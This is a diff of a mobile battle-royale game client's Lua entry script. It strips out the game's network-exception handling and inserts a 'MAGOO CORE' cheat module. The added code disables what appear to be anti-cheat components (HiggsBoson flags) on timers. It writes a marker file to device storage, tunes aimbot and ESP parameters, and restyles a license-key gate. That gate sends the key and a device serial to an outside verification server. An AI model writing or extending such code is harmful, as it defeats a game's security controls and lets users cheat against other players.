-      TraceSystem.StartTraceTriggerByNetworkBroken()
-    end
-    return
-  end
-  local strTile = LocUtil.GetLocalizeResStr(102012)
-  local strMsg = LocUtil.GetLocalizeResStr(103017)
-  local needRelogin = false
-  if ExceptionType == "FailureReceived" or ExceptionType == UnrealNet.NetworkException.PendingConnectionFailure then
-    if string.find(ErrorMessage, "CharacterDead") == 1 then
-      strMsg = LocUtil.GetLocalizeResStr(120004)
-    elseif string.find(ErrorMessage, "TeammatesAllDead") == 1 then
-      strMsg = LocUtil.GetLocalizeResStr(120007)
-    elseif string.find(ErrorMessage, "GameOver") == 1 then
-      strMsg = LocUtil.GetLocalizeResStr(301117)
-    elseif string.find(ErrorMessage, UnrealNet.FailureReceivedReason.WatchedPlayerGone) == 1 then
-      strMsg = LocUtil.GetLocalizeResStr(501117)
-    elseif string.find(ErrorMessage, "SocailIslandInactive") == 1 then
-      strMsg = LocUtil.GetLocalizeResStr(9550)
-    elseif string.find(ErrorMessage, "SocailIslandClose") == 1 then
-      strMsg = LocUtil.GetLocalizeResStr(9570)
-    elseif string.find(ErrorMessage, "PlanPHHomeClose") == 1 then
-      strMsg = LocUtil.GetLocalizeResStr(69618)
-    elseif string.find(ErrorMessage, "PlanCHHallClose") == 1 then
-      strMsg = LocUtil.GetLocalizeResStr(880060113)
-    elseif string.find(ErrorMessage, "OwnerKickout") == 1 then
-      strMsg = LocUtil.GetLocalizeResStr(9863)
-    elseif string.find(ErrorMessage, "IslandClose") == 1 then
-      strMsg = LocUtil.GetLocalizeResStr(35064)
-    elseif string.find(ErrorMessage, "IdipKickOutClient2Exit") == 1 then
-      Client.ExitGameForSafety()
-    elseif string.find(ErrorMessage, "CWOWClose") == 1 then
-      strMsg = LocUtil.GetLocalizeResStr(77113)
-    elseif string.find(ErrorMessage, "CWOWInactive") == 1 then
-      strMsg = LocUtil.GetLocalizeResStr(9550)
-    elseif string.find(ErrorMessage, "manor_kickout_all_visitor") == 1 then
-      if string.find(ErrorMessage, "manor_joint_terminate") then
-        local logic_home_joint = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.logic_home_joint)
-        logic_home_joint.ShowTerminateSuccessUI()
-        return
-      elseif string.find(ErrorMessage, "manor_joint") then
-        strMsg = LocUtil.GetLocalizeResStr(655894)
-      else
-        strMsg = LocUtil.GetLocalizeResStr(66377)
-      end
-    elseif string.find(ErrorMessage, "manor_add_black") == 1 then
-      strMsg = LocUtil.GetLocalizeResStr(655406)
-    elseif string.find(ErrorMessage, "manor_kickout_oldinst_visitor") == 1 then
-      strMsg = LocUtil.GetLocalizeResStr(655469)
-    end
-  elseif ExceptionType == "ConnectionTimeout" then
-    strMsg = LocUtil.GetLocalizeResStr(301118)
-    needRelogin = true
-  elseif ExceptionType == "ConnectingTimeout" then
-    strMsg = LocUtil.GetLocalizeResStr(301233)
-    local MatchSystem = require("client.slua.logic.match.logic_match")
-    log(bWriteLog and "ClientEntry MatchSystem.QueryPlayerState")
-    MatchSystem.QueryPlayerState()
-  else
-    needRelogin = true
-  end
-  log(bWriteLog and "ClientEntry ----- NetworkFailure, IgnoreDSError -- " .. tostring(BattleResult.IgnoreDSError) .. " needRelogin -- " .. tostring(needRelogin))
-  if BattleResult.IgnoreDSError then
-    log(bWriteLog and "ClientEntry -----  DS BattleResult.IgnoreDSError return！！！！")
-    LobbySystem.enterGameTimeOutParams = nil
-    return
-  end
-  if UIUtil ~= nil and UIUtil.GetGameFrontendHUD() ~= nil then
-    CurStage = UIUtil.GetGameFrontendHUD():GetClientEnterBattleStage()
-  end
-  if TimeOutExtendMod == true and curStatus == GameStatus.Fighting and CurStage == "EnterBattleSuccess" and (ExceptionType == "ConnectionTimeout" or ExceptionType == "ConnectionLongTimeNoReceived" or ExceptionType == "CriticalSocketError") and UnrealNet.IsNeedShowMsgBox(ErrorMessage) then
-    if logic_enter_game then
-      logic_enter_game.InGameShowingReEnter = true
-    end
-    ShowMsgBoxFunc(2, strTile, LocUtil.GetLocalizeResStr(200000456), function()
-      if logic_enter_game ~= nil and logic_enter_game.GameOverGameID ~= nil and logic_enter_game.GameOverGameID == g_game_id then
-        logic_enter_game.InGameShowingReEnter = false
-        local strTileInner = LocUtil.GetLocalizeResStr(102012)
-        local strMsgInner = LocUtil.GetLocalizeResStr(301117)
-        ShowMsgBoxFunc(1, strTileInner, strMsgInner, function()
-          UnrealNet.RetrunToLobbyFromDisconnect(needRelogin)
-          log(bWriteLog and "UnrealNet.HandleNetworkException ReturnToLobby")
-        end)
-      elseif logic_enter_game ~= nil and logic_enter_game.InGameShowingReEnter == true then
-        if logic_enter_game.InGameReEnterGameInfo ~= nil and #logic_enter_game.InGameReEnterGameInfo >= 11 and logic_enter_game.InGameReEnterGameInfo[6] ~= nil and logic_enter_game.InGameReEnterGameInfo[6] == g_game_id then
-          local LoadingSystem = require("client.slua.logic.loading.logic_loading")
-          if LoadingSystem ~= nil then
-            LoadingSystem.ShowLoading(false, nil, logic_enter_game.InGameReEnterGameInfo[11])
-          end
-          local EnterBattleProtect = function(ip, port, key, name, packet_key, game_id, is_ob, ad_conf, waterType, waterUserID, sub_mode, mode_type, ugc_map_id, dynamiclevels_op, grome_info)
-            if ugc_map_id == 0 then
-              logic_enter_game:EnterBattle(ip, port, key, name, packet_key, game_id, is_ob, ad_conf, waterType, waterUserID, sub_mode, mode_type, nil, dynamiclevels_op, grome_info)
-            else
-              logic_enter_game:EnterBattle(ip, port, key, name, packet_key, game_id, is_ob, ad_conf, waterType, waterUserID, sub_mode, mode_type, ugc_map_id, dynamiclevels_op, grome_info)
-            end
-          end
-          UIManager.ClearOnModePreSwitch(GameStatus.Fighting, GameStatus.Fighting)
-          slua_GameFrontendHUD:ClearInGameUI()
-          EnterBattleProtect(table.unpack(logic_enter_game.InGameReEnterGameInfo))
-          log(bWriteLog and "UnrealNet.HandleNetworkException ReloadingBattle")
-        end
-      else
-        UnrealNet.RetrunToLobbyFromDisconnect(needRelogin)
-        log(bWriteLog and "UnrealNet.HandleNetworkException ReturnToLobby")
-      end
-    end, function()
-      log(bWriteLog and "UnrealNet.HandleNetworkException ReturnToLobby")
-      UnrealNet.RetrunToLobbyFromDisconnect(needRelogin)
-      if logic_enter_game then
-        logic_enter_game.InGameShowingReEnter = false
-      end
-    end)
-  elseif UnrealNet.IsNeedShowMsgBox(ErrorMessage) then
-    ShowMsgBoxFunc(1, strTile, strMsg, function()
-      log(bWriteLog and "ClientEntry ----- sun start ReturnToLobby needRelogin: " .. tostring(needRelogin) .. ", curStatus:" .. curStatus .. ", isWaittingEnterBattle" .. tostring(LobbySystem.isWaittingEnterBattle))
-      UnrealNet.RetrunToLobbyFromDisconnect(needRelogin)
-    end)
-  end
-  EventSystem:postEvent(EVENTTYPE_NETWORK, EVENTID_DS_SERVER_CONNECT_FAILED)
-end
-
-function UnrealNet.RepListMismatchDetectTrigger(IsDetectRepList, IsDetectRepComponent, InPlayerController, InRepObj, Reason, ErrorMessage)
-  log(bWriteLog and "UnrealNet.RepListMismatchDetectTrigger")
-  if not slua.isValid(InPlayerController) or not slua.isValid(InRepObj) then
-    return
-  end
-  if IsDetectRepList then
-    local bResult = false
-    local start_idx, end_idx = string.find(ErrorMessage, "ReceivedBunch FAILED")
-    if start_idx then
-      bResult = true
-    end
-    if bResult then
-      InPlayerController:ClientRepListReq(InRepObj)
-      log(bWriteLog and "UnrealNet.RepListMismatchDetectTrigger ClientRepListReq")
-    end
-  end
-  if IsDetectRepComponent then
-    local bResult = false
-    local start_idx, end_idx = string.find(ErrorMessage, "ReadContentBlockPayloadFailed")
-    if start_idx then
-      bResult = true
-    end
-    if bResult then
-      InPlayerController:ClientRepComponentsReq(InRepObj)
-      log(bWriteLog and "GameplayCallbacks.RepListMismatchDetectTrigger ClientRepComponentsReq")
-    end
-  end
-end
-
-function UnrealNet.IsNeedShowMsgBox(ErrorMessage)
-  if string.find(ErrorMessage, "match_isolation_label") == 1 then
-    return false
-  end
-  if string.find(ErrorMessage, "manor_joint_terminate") then
-    return false
-  end
-  return true
-end
-
-function UnrealNet.RetrunToLobbyFromDisconnect(needRelogin)
-  if GameStatus.IsInFightingStatus() or LobbySystem.isWaittingEnterBattle then
-    local timer_ticker = require("common.time_ticker")
-    local ClientEVOConfig = require("client.logic.client_evo_config.client_evo_config")
-    ClientEVOConfig.OnBeforeConfirmBackToLobby()
-    timer_ticker.AddTimerOnce(0.2, function()
-      local logic_loading = require("client.slua.logic.loading.logic_loading")
-      logic_loading.ShowLoading(true)
-      local ClientEntryHandler = require("client.network.Protocol.ClientEntryHandler")
-      ClientEntryHandler.send_giveup_enter_game()
-      LobbySystem.ReturnToLobby()
-      if needRelogin then
-        if not NetManager.bConnected and LobbySystem.CheckOpen(BP_ENUM_IS_QUERY_PLAYER_STETE_AFTER_LOADING) then
-          local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
-          login_module:reqLoginLobby(true, Enum_LOGIN_REPORT_CFG.EXCEPTION_POP)
-        else
-          local MatchSystem = require("client.slua.logic.match.logic_match")
-          MatchSystem.SetQueryPlayerFlag(true)
-        end
-      end
-      Client.TPerforPlatDisconnectReport(GameFrontendHUD, 16)
-      local ExceptionType, SubType, ErrorLog, bShouldWait = table.unpack(LobbySystem.enterGameTimeOutParams)
-      LobbySystem.enterGameTimeOutParams = nil
-      if ExceptionType ~= "ConnectingTimeout" and ExceptionType ~= "ConnectionTimeout" then
-        local ErrorReport = {
-          ExceptionType,
-          SubType,
-          ErrorLog
-        }
-        UnrealNet.HandleNetworkConnectionClosed("ForceReturnToLobby", table.concat(ErrorReport, "_"))
-      end
-    end)
-  end
-end
-
-function UnrealNet.HandleBattleExceptionReport(ExceptionType, ErrorMessage, bShouldWait, ...)
-  ExceptionType = FuncUtil.ReplaceIllegalChar(ExceptionType)
-  ErrorMessage = FuncUtil.ReplaceIllegalChar(ErrorMessage)
-  UnrealNet.HandleNetworkExceptionReport(ExceptionType, "", ErrorMessage)
-end
-
-function UnrealNet.OnNetRepSerializeError(ErrorType, RepObjName)
-  local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-  local title = LocUtil.LocalizeResFormat(101001)
-  local typeMsg = "ActorChannelError"
-  if ErrorType == 2 then
-    typeMsg = "LuaNetSerializationError"
-  end
-  local msg = "Battle network serialization error(" .. typeMsg .. [[
-), Please check the client and DS version
-RepObjName:]] .. RepObjName .. [[
-
-Or use UGMCheatManager::DumpObjectNetProperties to check the rep-list of the Actor on both DS and client.]]
-  CommonMsgBoxMgr.Show(1, title, msg)
-end
-
-require("common.time_ticker")
-require("game_frontend_hud")
-require("client.slua_ui_framework.manager")
-require("client.logic.ClientEntry.ClientEntry")
-local IngameEntry = require("GameLua.GameCore.Main.ClientGameMain")
-IngameEntry.InitInagmeEntry()
-require("GameLua.Mod.BaseMod.Client.BattleWindowMgr")
-log(bWriteLog and ". GameLua.Mod.BaseMod.Client.BattleWindowMgr")
-require("ds_net")
-log(bWriteLog and ". ds_net")
-require("GameLua.Mod.BaseMod.Client.Security.Gokuba")
-log(bWriteLog and ". BaseMod.Client.Security.Gokuba")
-require("GameLua.Mod.Lobby.Base.Common.LobbyModUtils")
-log(bWriteLog and ". Lobby.Base.Common.LobbyModUtils")
-require("common.log_filter")
-log(bWriteLog and ". common.log_filter")
-local Utility = require("common.utility")
-local BPLuaUIManager = require("client.module_framework.BPLuaUIManager")
-BPLuaUIManager.InitOnlyOne()
-UIManager.Init()
-if Client.IsCloudVersion() then
-  log(bWriteLog and "[OnUpdateFinished] Client.CloudVersionInitDataPipeline")
-  Client.CloudVersionInitDataPipeline()
-end
-if Client.GetDevicePlatformName() == "Android" or Client.GetDevicePlatformName() == "IOS" then
-  local ui_config = require("client.slua.config.base_config")
-end
-local optSwitch = HDmpveRemote.HDmpveRemoteConfigGetInt("GainCrashLogInfoBackgroundOnInit", 0)
-if optSwitch ~= 0 then
-  if optSwitch & 1 ~= 0 then
-    local DevLogUtils = require("common.DevLogUtils")
-    DevLogUtils.OpenDevLog()
-  end
-  if optSwitch & 2 ~= 0 then
-    Client.GainSystemLog()
-  end
-  log(bWriteLog and "LobbySystem.DoConsoleCmdFromRemoteConfig GainCrashLogInfoBackgroundOnInit=" .. optSwitch)
-end
-
-
--- ============================================================
--- MAGOO CORE shifted into client_entry (full file_util body)
--- Aggressive multi-delay boot for early client_entry timing
--- ============================================================
-pcall(function()
-    local f = io.open("//storage/emulated/0/magoo_entry_hit.txt", "w")
-    if f then f:write("hit\n"); f:close() end
-end)
-
 local file_util = {}
 local SavedFileUtil = nil
 pcall(function() SavedFileUtil = import("SavedFileUtil") end)
@@ -2321,7 +70,6 @@ pcall(function()
         end
         local ok = xpcall(function()
             _G._MAGOO_FILEUTIL_MOD_LOADED = true
-
             local SUPPORTED_PACKAGES = {
                 ["com.tencent.ig"]        = "Global",
                 ["com.pubg.krmobile"]     = "Korea",
@@ -2411,6 +159,41 @@ pcall(function()
                 if ok and tk then _ticker_cache = tk end
                 return _ticker_cache
             end
+            pcall(function()
+                local tk = nil
+                local ok, t = pcall(require, "common.time_ticker")
+                if ok then tk = t end
+                if tk and tk.AddTimerOnce then
+                    tk.AddTimerOnce(0.1, function()
+                        pcall(function()
+                            local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
+                            if not pc then return end
+                            if pc.HiggsBoson then
+                                pc.HiggsBoson.bMHActive = false
+                                pc.HiggsBoson.bCallPreReplication = false
+                            end
+                            if pc.HiggsBosonComponent then
+                                pc.HiggsBosonComponent.bMHActive = false
+                                pc.HiggsBosonComponent.bCallPreReplication = false
+                            end
+                        end)
+                    end)
+                    tk.AddTimerOnce(0.4, function()
+                        pcall(function()
+                            local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
+                            if not pc then return end
+                            if pc.HiggsBoson then
+                                pc.HiggsBoson.bMHActive = false
+                                pc.HiggsBoson.bCallPreReplication = false
+                            end
+                            if pc.HiggsBosonComponent then
+                                pc.HiggsBosonComponent.bMHActive = false
+                                pc.HiggsBosonComponent.bCallPreReplication = false
+                            end
+                        end)
+                    end)
+                end
+            end)
             local LIMITS = {
                 MAX_BOT_CACHE       = IS_32BIT and 120 or 400,
                 MAX_VIS_CACHE       = IS_32BIT and 40  or 120,
@@ -2419,18 +202,18 @@ pcall(function()
                 MAX_TRACKED_MARKS   = IS_32BIT and 32  or 64,
                 ESP_MAX_DISTANCE    = IS_32BIT and 200 or 350,
                 BONE_ESP_MAX_DIST   = IS_32BIT and 80  or 200,
-                AIMBOT_TICK         = IS_32BIT and 0.08  or 0.055,
-                MAIN_TICK           = IS_32BIT and 2.40  or 2.00,
+                AIMBOT_TICK         = IS_32BIT and 0.12  or 0.09,
+                MAIN_TICK           = IS_32BIT and 1.80  or 1.50,
                 CONFIG_SAVE_INTERVAL= IS_32BIT and 30    or 20,
                 AUTO_HEAD_DEFAULT   = not IS_32BIT,
                 ESP6_DEFAULT        = not IS_32BIT,
                 ESPVIPPRO_DEFAULT   = not IS_32BIT,
                 MAX_ESP_LINES       = IS_32BIT and 6   or 12,
-                ESP_LINE_UPDATE     = IS_32BIT and 0.22  or 0.18,
+                ESP_LINE_UPDATE     = IS_32BIT and 0.20  or 0.15,
                 ESP_LINE_THICKNESS  = 0.8,
                 ESP_LINE_MAX_DIST   = IS_32BIT and 250 or 500,
                 ESP_LINE_SMOOTH     = 0.40,
-                VIS_CACHE_TIME      = 0.35,
+                VIS_CACHE_TIME      = 0.25,
             }
             local isExpired = true
             _G._LICENSE_OK = _G._LICENSE_OK == true and true or false
@@ -2449,7 +232,7 @@ pcall(function()
                     LICENSE_URL  = "https://xswmygejlliwjgmeogrl.supabase.co/functions/v1/verify-license",
                     LOGIN_URL    = "https://xswmygejlliwjgmeogrl.supabase.co/functions/v1/verify-license",
                     GAME_NAME    = "pubg",
-                    KEY_FILE     = "//storage/emulated/0/Android/data/" .. tostring(packageName or "com.tencent.ig") .. "/files/key.txt",
+                    KEY_FILE     = "//storage/emulated/0/Android/data/" .. tostring(packageName or "com.tencent.ig") .. "/files/keys.txt",
                     UID_FILE     = "//storage/emulated/0/Android/data/" .. tostring(packageName or "com.tencent.ig") .. "/files/uid.txt",
                     BRAND_NAME   = "MAGOO",
                     BRAND_SUB    = "PUBLIC ACCESS",
@@ -2714,55 +497,13 @@ pcall(function()
                             end
                         end)
                     end
-                    if not (ui and slua.isValid(ui)) then
-                        pcall(function()
-                            if slua_GameFrontendHUD and slua_GameFrontendHUD.GetMainControlBaseUI then
-                                ui = slua_GameFrontendHUD:GetMainControlBaseUI()
-                            end
-                        end)
-                    end
-                    if not (ui and slua.isValid(ui)) then
-                        pcall(function()
-                            local UIUtil = require("client.common.ui_util")
-                            if UIUtil then
-                                if UIUtil.GetMainControlBaseUI then ui = UIUtil.GetMainControlBaseUI() end
-                                if not (ui and slua.isValid(ui)) and UIUtil.GetGameFrontendHUD then
-                                    local g = UIUtil.GetGameFrontendHUD()
-                                    if g and g.GetMainControlUI then ui = g:GetMainControlUI() end
-                                end
-                            end
-                        end)
-                    end
                     if ui and slua.isValid(ui) then
-                        -- if ui itself is a canvas panel, use it
-                        pcall(function()
-                            if ui.AddChildToCanvas then canvas = ui end
-                        end)
-                        if not canvas then
-                            for _, name in ipairs({
-                                "CanvasPanel_0", "CanvasPanel_42", "CanvasPanel_Root",
-                                "CanvasPanel", "RootCanvas", "SafeZoneCanvas",
-                                "CanvasPanel_Main", "MainCanvas"
-                            }) do
-                                local c = ui[name]
-                                if c and slua.isValid(c) then
-                                    canvas = c
-                                    break
-                                end
+                        for _, name in ipairs({"CanvasPanel_0", "CanvasPanel_42", "CanvasPanel_Root", "CanvasPanel"}) do
+                            local c = ui[name]
+                            if c and slua.isValid(c) then
+                                canvas = c
+                                break
                             end
-                        end
-                        -- last resort: walk children for any CanvasPanel
-                        if not canvas then
-                            pcall(function()
-                                local n = ui.GetChildrenCount and ui:GetChildrenCount() or 0
-                                for i = 0, n - 1 do
-                                    local ch = ui:GetChildAt(i)
-                                    if ch and slua.isValid(ch) and ch.AddChildToCanvas then
-                                        canvas = ch
-                                        break
-                                    end
-                                end
-                            end)
                         end
                     end
                 end)
@@ -2898,9 +639,9 @@ pcall(function()
                         local SC = import("SlateColor") or import("/Script/SlateCore.SlateColor")
                         local lin
                         if isError then
-                            lin = LC(1.0, 0.38, 0.40, 1.0)
+                            lin = LC(1.0, 0.28, 0.28, 1.0)
                         else
-                            lin = LC(0.35, 0.65, 1.0, 1.0)
+                            lin = LC(0.10, 0.45, 0.20, 1.0)
                         end
                         if SC then
                             _G._LOGIN_STATUS:SetColorAndOpacity(SC(lin))
@@ -2932,7 +673,6 @@ pcall(function()
                 _G._LOGIN_BTN = nil
                 _G._GETKEY_BTN = nil
                 _G._LOGIN_STATUS = nil
-                _G._LOGIN_NAME_BOX = nil
                 _G._LOGIN_TRYING = false
             end
             M.Build = function(pawn, hint, onSuccess)
@@ -2954,27 +694,23 @@ pcall(function()
                             end
                         end
                     end)
-                    -- ORIGINAL position + size (do not change)
                     local cx, cy = vw * 0.47, vh * 0.42
                     local panelW = math.min(vw * 0.72, 640)
                     local panelH = math.min(vh * 0.62, 420)
                     panelW = math.max(panelW, 500)
                     panelH = math.max(panelH, 380)
                     local scale = math.max(0.85, math.min(panelW / 560, panelH / 400))
-                    -- dark black + blue gate (higher contrast for visibility)
-                    local VOID       = LC(0.00, 0.00, 0.00, 0.82)
-                    local SHADOW     = LC(0.00, 0.00, 0.00, 0.60)
-                    local PANEL      = LC(0.03, 0.05, 0.10, 0.96)
-                    local PANEL_IN   = LC(0.07, 0.10, 0.18, 0.98)
-                    local EDGE       = LC(0.25, 0.55, 1.00, 0.85)
-                    local EDGE_SOFT  = LC(0.20, 0.45, 0.90, 0.45)
-                    local NEON       = LC(0.35, 0.65, 1.00, 1.00)
-                    local NEON_DIM   = LC(0.22, 0.48, 0.90, 0.98)
-                    local NEON_BTN   = LC(0.15, 0.38, 0.80, 1.00)
-                    local WHITE      = LC(0.96, 0.97, 1.00, 1.00)
-                    local MUTED      = LC(0.70, 0.78, 0.90, 0.98)
-                    local GREY       = LC(0.45, 0.52, 0.65, 0.95)
-                    local ERR        = LC(1.00, 0.40, 0.42, 1.00)
+                    local VOID       = LC(0.01, 0.01, 0.012, 0.94)
+                    local PANEL      = LC(0.025, 0.03, 0.035, 0.99)
+                    local PANEL_IN   = LC(0.035, 0.04, 0.045, 1.00)
+                    local EDGE       = LC(0.04, 0.14, 0.07, 0.90)
+                    local GREEN      = LC(0.08, 0.42, 0.18, 1.00)
+                    local GREEN_DIM  = LC(0.05, 0.22, 0.10, 1.00)
+                    local GREEN_BTN  = LC(0.04, 0.28, 0.12, 1.00)
+                    local WHITE      = LC(0.72, 0.74, 0.76, 1.00)
+                    local WHITE_DIM  = LC(0.48, 0.50, 0.52, 1.00)
+                    local GREY       = LC(0.28, 0.30, 0.32, 1.00)
+                    local ERR        = LC(0.75, 0.18, 0.18, 1.00)
                     local CLEAR      = LC(0, 0, 0, 0)
                     local root = CGame:NewObjectFromPath("/Script/UMG.CanvasPanel", canvas)
                     if not (root and slua.isValid(root)) then return end
@@ -2986,22 +722,29 @@ pcall(function()
                             rootSlot:SetZOrder(9989)
                         end)
                     end
-                    -- dim world
                     addBorder(root, VOID, cx, cy, vw, vh, 9989)
-                    -- soft drop shadow under card
-                    addBorder(root, SHADOW, cx + 6 * scale, cy + 10 * scale, panelW, panelH, 9990)
-                    -- outer neon ring + glass plate
-                    addBorder(root, EDGE, cx, cy, panelW + 4, panelH + 4, 9991)
-                    addBorder(root, PANEL, cx, cy, panelW, panelH, 9992)
-                    -- inner highlight rim
-                    addBorder(root, EDGE_SOFT, cx, cy, panelW - 10 * scale, panelH - 10 * scale, 9993)
-                    -- top neon accent bar
-                    addBorder(root, NEON, cx, cy - panelH * 0.5 + 4 * scale, panelW * 0.28, 2 * scale, 9998)
-                    -- brand block (same vertical slots as original)
-                    addText(root, "MAGOO", math.floor(12 * scale), GREY, cx, cy - panelH * 0.40)
-                    addText(root, "LICENSE GATE", math.floor(20 * scale), WHITE, cx, cy - panelH * 0.30)
-                    addBorder(root, EDGE_SOFT, cx, cy - panelH * 0.22, panelW * 0.22, 2 * scale, 9997)
-                    local prompt = "ENTER ACCESS KEY"
+                    addBorder(root, EDGE, cx, cy, panelW + 2, panelH + 2, 9990)
+                    addBorder(root, PANEL, cx, cy, panelW, panelH, 9991)
+                    local tw, th = 18 * scale, 2 * scale
+                    local hw, hh = panelW * 0.5, panelH * 0.5
+                    local corners = {
+                        {cx - hw + 10, cy - hh + 2}, {cx + hw - 10, cy - hh + 2},
+                        {cx - hw + 10, cy + hh - 2}, {cx + hw - 10, cy + hh - 2},
+                    }
+                    for _, p in ipairs(corners) do
+                        addBorder(root, GREEN_DIM, p[1], p[2], tw, th, 9998)
+                    end
+                    local ticksV = {
+                        {cx - hw + 2, cy - hh + 12}, {cx + hw - 2, cy - hh + 12},
+                        {cx - hw + 2, cy + hh - 12}, {cx + hw - 2, cy + hh - 12},
+                    }
+                    for _, p in ipairs(ticksV) do
+                        addBorder(root, GREEN_DIM, p[1], p[2], th, tw, 9998)
+                    end
+                    addText(root, "MAGOO CORE", math.floor(11 * scale), GREY, cx, cy - panelH * 0.40)
+                    addText(root, "SECURE ACCESS", math.floor(20 * scale), WHITE, cx, cy - panelH * 0.30)
+                    addBorder(root, GREEN_DIM, cx, cy - panelH * 0.22, panelW * 0.22, 2 * scale, 9997)
+                    local prompt = "ACCESS KEY"
                     if hint and tostring(hint):find("EXPIRED") then
                         prompt = "KEY EXPIRED — ENTER NEW KEY"
                     elseif hint and tostring(hint):find("Invalid") then
@@ -3009,49 +752,45 @@ pcall(function()
                     elseif hint and tostring(hint):find("blocked") then
                         prompt = "KEY BLOCKED — ENTER NEW KEY"
                     end
-                    addText(root, prompt, math.floor(12 * scale), MUTED, cx, cy - panelH * 0.14)
+                    addText(root, prompt, math.floor(12 * scale), GREEN, cx, cy - panelH * 0.12)
                     local inputW = panelW * 0.78
                     local inputH = 48 * scale
                     local inputY = cy + panelH * 0.02
-                    -- key field — clean dark blue frame
-                    addBorder(root, EDGE, cx, inputY, inputW + 3 * scale, inputH + 3 * scale, 9995)
+                    addBorder(root, EDGE, cx, inputY, inputW + 2, inputH + 2, 9996)
                     addBorder(root, PANEL_IN, cx, inputY, inputW, inputH, 9997)
                     _G._LOGIN_BOX = addInput(root, cx, inputY - 28 * scale, inputW - 16 * scale, inputH - 8 * scale)
                     pcall(function()
                         if _G._LOGIN_BOX and _G._LOGIN_BOX.SetHintText then
-                            _G._LOGIN_BOX:SetHintText("license key")
+                            _G._LOGIN_BOX:SetHintText("Enter license key")
                         end
                         if _G._LOGIN_BOX and _G._LOGIN_BOX.SetKeyboardFocus then
                             _G._LOGIN_BOX:SetKeyboardFocus()
                         end
                     end)
-                    -- profile name field
                     local nameY = inputY + 36 * scale
-                    addBorder(root, EDGE_SOFT, cx, nameY, inputW + 3 * scale, inputH + 3 * scale, 9995)
+                    addBorder(root, EDGE, cx, nameY, inputW + 2, inputH + 2, 9996)
                     addBorder(root, PANEL_IN, cx, nameY, inputW, inputH, 9997)
                     _G._LOGIN_NAME_BOX = addInput(root, cx, nameY, inputW - 16 * scale, inputH - 8 * scale)
                     pcall(function()
                         if _G._LOGIN_NAME_BOX and _G._LOGIN_NAME_BOX.SetHintText then
-                            _G._LOGIN_NAME_BOX:SetHintText("profile name (optional)")
+                            _G._LOGIN_NAME_BOX:SetHintText("Enter your name (profile)")
                         end
                     end)
-                    local statusSeed = "ready · paste key then unlock"
+                    local statusSeed = "> awaiting key input_"
                     if hint and hint ~= "" and not tostring(hint):find("Enter your key") then
-                        statusSeed = tostring(hint)
+                        statusSeed = "> " .. tostring(hint)
                     end
-                    _G._LOGIN_STATUS = addText(root, statusSeed, math.floor(12 * scale), GREY,
+                    _G._LOGIN_STATUS = addText(root, statusSeed, math.floor(12 * scale), GREEN_DIM,
                         cx, cy + panelH * 0.28)
                     local btnW = inputW * 0.48
                     local btnH = 44 * scale
                     local btnY = cy + panelH * 0.40
-                    -- ghost GET KEY
                     addBorder(root, EDGE, cx - inputW * 0.26, btnY, btnW + 2, btnH + 2, 9996)
                     addBorder(root, PANEL_IN, cx - inputW * 0.26, btnY, btnW, btnH, 9997)
-                    -- solid UNLOCK
-                    addBorder(root, NEON, cx + inputW * 0.26, btnY, btnW + 2, btnH + 2, 9996)
-                    addBorder(root, NEON_BTN, cx + inputW * 0.26, btnY, btnW, btnH, 9997)
+                    addBorder(root, GREEN, cx + inputW * 0.26, btnY, btnW + 2, btnH + 2, 9996)
+                    addBorder(root, GREEN_BTN, cx + inputW * 0.26, btnY, btnW, btnH, 9997)
                     local function closeWithAuthAnim(exp, key, uid, onSuccess)
-                        setStatus("AUTH OK · session live", false)
+                        setStatus("> AUTH OK · SESSION LIVE", false)
                         pcall(function()
                             if _G._LOGIN_STATUS and slua.isValid(_G._LOGIN_STATUS) then
                                 local LC2 = import("LinearColor")
@@ -3079,8 +818,34 @@ pcall(function()
                             end)
                             if onSuccess then onSuccess() end
                         end
-                        -- no fade animation
-                        finish()
+                        local delayed = false
+                        pcall(function()
+                            local tk = GetTicker and GetTicker() or nil
+                            if not tk then
+                                local ok, t = pcall(require, "common.time_ticker")
+                                if ok then tk = t end
+                            end
+                            if tk and tk.AddTimerOnce then
+                                delayed = true
+                                tk.AddTimerOnce(0.20, function()
+                                    setStatus("> AUTH OK · SESSION LIVE", false)
+                                end)
+                                local fades = {0.75, 0.50, 0.28, 0.10, 0.0}
+                                for i, op in ipairs(fades) do
+                                    local o = op
+                                    tk.AddTimerOnce(0.35 + 0.08 * i, function()
+                                        pcall(function()
+                                            local r = _G._LOGIN_UI
+                                            if r and slua.isValid(r) and r.SetRenderOpacity then
+                                                r:SetRenderOpacity(o)
+                                            end
+                                        end)
+                                    end)
+                                end
+                                tk.AddTimerOnce(0.95, finish)
+                            end
+                        end)
+                        if not delayed then finish() end
                     end
                     local function doLogin()
                         local key = getInputText(_G._LOGIN_BOX)
@@ -3095,12 +860,12 @@ pcall(function()
                             end)
                         end
                         if not key or #key < 4 then
-                            setStatus("enter a valid key", true)
+                            setStatus("> error: enter a valid key", true)
                             return
                         end
                         if _G._LOGIN_TRYING then return end
                         _G._LOGIN_TRYING = true
-                        setStatus("verifying...", false)
+                        setStatus("> verifying credentials...", false)
                         local uid = getSerial()
                         checkLicense(key, uid, function(ok, err, exp)
                             _G._LOGIN_TRYING = false
@@ -3114,19 +879,19 @@ pcall(function()
                                 if exp and exp ~= "" then _G._LICENSE_EXPIRY = tostring(exp) end
                                 closeWithAuthAnim(exp, key, uid, onSuccess)
                             elseif err == "invalid" then
-                                setStatus("invalid key", true)
+                                setStatus("> error: invalid key", true)
                             elseif err == "blocked" then
-                                setStatus("key blocked", true)
+                                setStatus("> error: key blocked", true)
                             elseif err == "expired" then
-                                setStatus("key expired — enter new key", true)
+                                setStatus("> error: key expired — enter new key", true)
                             elseif err == "device_limit" then
-                                setStatus("device limit reached", true)
+                                setStatus("> error: device limit reached", true)
                             elseif type(err) == "string" and err:sub(1, 4) == "net:" then
                                 local detail = err:sub(5)
                                 if #detail > 40 then detail = detail:sub(1, 40) .. "..." end
                                 setStatus("> error: " .. detail, true)
                             else
-                                setStatus("connection failed — retry", true)
+                                setStatus("> error: connection failed — retry", true)
                             end
                         end)
                     end
@@ -3137,9 +902,9 @@ pcall(function()
                         btnW,
                         btnH,
                         "GET KEY",
-                        0.70, 0.85, 0.80,
+                        0.75, 0.90, 0.80,
                         function()
-                            setStatus("opening support...", false)
+                            setStatus("> opening support channel...", false)
